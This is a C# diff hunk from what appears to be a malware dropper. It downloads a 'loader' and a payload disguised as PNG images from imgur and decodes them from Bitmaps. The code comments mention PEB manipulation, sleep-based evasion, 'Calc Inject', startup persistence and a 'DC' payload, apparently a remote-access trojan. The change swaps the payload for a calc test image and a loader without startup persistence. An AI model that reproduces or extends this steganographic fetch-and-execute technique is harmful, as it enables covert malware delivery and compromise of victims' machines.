@@ -22,14 +22,8 @@ namespace imgc
 
                 Console.WriteLine("Downloading files...");
 
-                string loader = @"http://i.imgur.com/gWuzRIT.png"; // PEB + VBC + Sleep (a lot of sleep)
-                //string loader = @"http://i.imgur.com/6JArmAw.png"; // PEB + VBC + Sleep
-                //string loader = @"http://i.imgur.com/JwugQNp.png"; // No PEB
-                //string loader = @"http://i.imgur.com/y66QVE2.png"; // No Startup
-                //string loader = @"http://i.imgur.com/uCjfBnJ.png"; // Calc Inject
-                //string loader = @"http://i.imgur.com/lSLvJuj.png"; // Startup            
-                //string file = @"http://i.imgur.com/zN07hYc.png"; //CALC
-                string file = @"http://i.imgur.com/cRrFmjj.png"; // DC
+                string loader = @"http://i.imgur.com/y66QVE2.png"; // No Startup                                
+                string file = @"http://i.imgur.com/zN07hYc.png"; //CALC                
                 var requestLoader = WebRequest.Create(loader);
                 var requestFile = WebRequest.Create(file);
                 Bitmap loaderIMG;
